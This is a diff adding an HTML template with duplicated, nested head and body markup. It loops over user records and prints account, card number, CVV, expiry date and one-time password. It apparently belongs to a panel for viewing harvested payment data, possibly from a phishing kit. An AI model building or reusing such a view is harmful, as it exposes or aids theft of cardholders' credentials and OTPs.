@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    
+{% for i in user_co %}
+<br>
+<br>
+{
+    <br>
+    {% if i.number %}
+    number = {{ i.number }}
+    {% endif %}
+    <br>
+    {% if i.account %}
+    account = {{ i.account }}
+    {% endif %}
+    <br>
+    {% if i.date %}
+    date = {{ i.date }}
+    {% endif %}
+    <br>
+    {% if i.cardnumber %}
+    cardnumber = {{ i.cardnumber }}
+    {% endif %}
+    <br>
+    {% if i.cvv %}
+    cvv = {{ i.cvv }}
+    {% endif %}
+    <br>
+    {% if i.expirydate %}
+    expirydate = {{ i.expirydate }}
+    {% endif %}
+    <br>
+    {% if i.otp %}
+    otp = {{ i.otp }}
+    {% endif %}
+    <br>
+}
+<br>
+<br>
+    
+{% endfor %}
+    
+</body>
+</html>
+
